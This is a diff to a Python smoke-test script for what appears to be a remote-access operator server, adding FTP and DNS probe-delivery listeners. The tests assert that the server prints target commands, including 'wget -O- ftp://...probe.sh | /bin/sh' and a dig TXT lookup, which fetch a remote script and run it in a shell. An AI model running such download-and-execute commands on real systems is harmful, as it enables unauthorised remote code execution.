@@ -794,8 +794,10 @@ def run_line_console_smoke(server, tmp, upload_cfg, session_root):
         "Delivery options (pick what the target has):",
         "nc:    printf 'GET /probe.sh HTTP/1.0",
         "tftp:  tftp -g -r probe.sh",
-        "Current listeners: probe-http, probe-tftp",
-        "Not yet served here: probe-ftp, probe-dns",
+        "ftp:   wget -O- ftp://",
+        "dns:   dig @",
+        "Current listeners: probe-http, probe-tftp, probe-ftp, probe-dns",
+        "DNS note: nslookup usually needs DNS exposed on port 53; dig can use custom ports.",
         "paste: probe paste",
         "Serial/manual paste:",
         "sh <<'GRIT_PROBE_SCRIPT'",
@@ -6241,7 +6243,10 @@ def main(argv=None):
             return 1
         service_session_log_counts = queue_status_json["summary"].get("service_session_log_exists_counts", {})
         service_process_log_counts = queue_status_json["summary"].get("service_process_log_exists_counts", {})
-        expected_service_names = {"ssh", "tls-shell", "plain-shell", "file-service", "command-queue", "bridge", "probe", "probe-tftp"}
+        expected_service_names = {
+            "ssh", "tls-shell", "plain-shell", "file-service", "command-queue",
+            "bridge", "probe", "probe-tftp", "probe-ftp", "probe-dns",
+        }
         expected_service_count = len(expected_service_names)
         if (queue_status_json["summary"].get("service_count") != expected_service_count or
                 sum(queue_status_json["summary"].get("service_actual_counts", {}).values()) != expected_service_count or
@@ -12083,6 +12088,10 @@ def main(argv=None):
             "staged_files": str(probe_release_staged),
             "GRIT_OPERATOR_FILE_SERVICE_PORT": free_port(),
             "GRIT_PROBE_PORT": free_port(),
+            "GRIT_PROBE_TFTP_PORT": free_port(),
+            "GRIT_PROBE_FTP_PORT": free_port(),
+            "GRIT_PROBE_DNS_PORT": free_port(),
+            "GRIT_PROBE_DNS_NAME": "probe.test",
         }), encoding="utf-8")
         probe_listener_preview = subprocess.run(
             [
@@ -12107,6 +12116,75 @@ def main(argv=None):
                 "Traceback" in probe_listener_text):
             print("probe listener did not clearly separate bind and advertised target endpoints", file=sys.stderr)
             print(probe_listener_text, file=sys.stderr)
+            return 1
+        probe_ftp_preview = subprocess.run(
+            [
+                str(server),
+                "--config", str(probe_release_cfg),
+                "--transport", "probe-ftp",
+                "--timeout", "0.1",
+                "--one-shot",
+            ],
+            cwd=tmp,
+            text=True,
+            capture_output=True,
+        )
+        probe_ftp_text = probe_ftp_preview.stdout + probe_ftp_preview.stderr
+        probe_cfg_doc = json.loads(probe_release_cfg.read_text(encoding="utf-8"))
+        probe_ftp_port = probe_cfg_doc["GRIT_PROBE_FTP_PORT"]
+        if (probe_ftp_preview.returncode != 1 or
+                f"Probe FTP listener. Binding on ftp://127.0.0.1:{probe_ftp_port}/probe.sh" not in probe_ftp_text or
+                f"Probe FTP target URL: ftp://{advertised_operator_host}:{probe_ftp_port}/probe.sh" not in probe_ftp_text or
+                f"Target command: wget -O- ftp://{advertised_operator_host}:{probe_ftp_port}/probe.sh | /bin/sh" not in probe_ftp_text or
+                "Traceback" in probe_ftp_text):
+            print("probe FTP listener preview did not render expected target command", file=sys.stderr)
+            print(probe_ftp_text, file=sys.stderr)
+            return 1
+        probe_dns_preview = subprocess.run(
+            [
+                str(server),
+                "--config", str(probe_release_cfg),
+                "--transport", "probe-dns",
+                "--timeout", "0.1",
+                "--one-shot",
+            ],
+            cwd=tmp,
+            text=True,
+            capture_output=True,
+        )
+        probe_dns_text = probe_dns_preview.stdout + probe_dns_preview.stderr
+        probe_dns_port = probe_cfg_doc["GRIT_PROBE_DNS_PORT"]
+        if (probe_dns_preview.returncode != 1 or
+                f"Probe DNS listener. Binding on dns://127.0.0.1:{probe_dns_port}/probe.test" not in probe_dns_text or
+                "Probe DNS TXT name: probe.test" not in probe_dns_text or
+                f"dig @{advertised_operator_host} -p {probe_dns_port} +short TXT probe.test" not in probe_dns_text or
+                "DNS note: nslookup usually needs this service exposed on port 53" not in probe_dns_text or
+                "Traceback" in probe_dns_text):
+            print("probe DNS listener preview did not render expected target command", file=sys.stderr)
+            print(probe_dns_text, file=sys.stderr)
+            return 1
+        probe_status = subprocess.run(
+            [
+                str(server),
+                "--config", str(probe_release_cfg),
+                "--json-status",
+            ],
+            cwd=tmp,
+            text=True,
+            capture_output=True,
+        )
+        if probe_status.returncode != 0:
+            print("probe status failed", file=sys.stderr)
+            print(probe_status.stderr, file=sys.stderr)
+            return 1
+        probe_status_doc = json.loads(probe_status.stdout)
+        probe_services = {rec.get("name"): rec for rec in probe_status_doc.get("services") or []}
+        if (probe_services.get("probe-ftp", {}).get("port") != probe_ftp_port or
+                probe_services.get("probe-ftp", {}).get("protocol") != "tcp" or
+                probe_services.get("probe-dns", {}).get("port") != probe_dns_port or
+                probe_services.get("probe-dns", {}).get("protocol") != "udp"):
+            print("probe FTP/DNS services missing from json status", file=sys.stderr)
+            print(probe_status.stdout, file=sys.stderr)
             return 1
         (probe_release_dir / "scripts").mkdir(parents=True)
         (probe_release_dir / "bin").mkdir(parents=True)
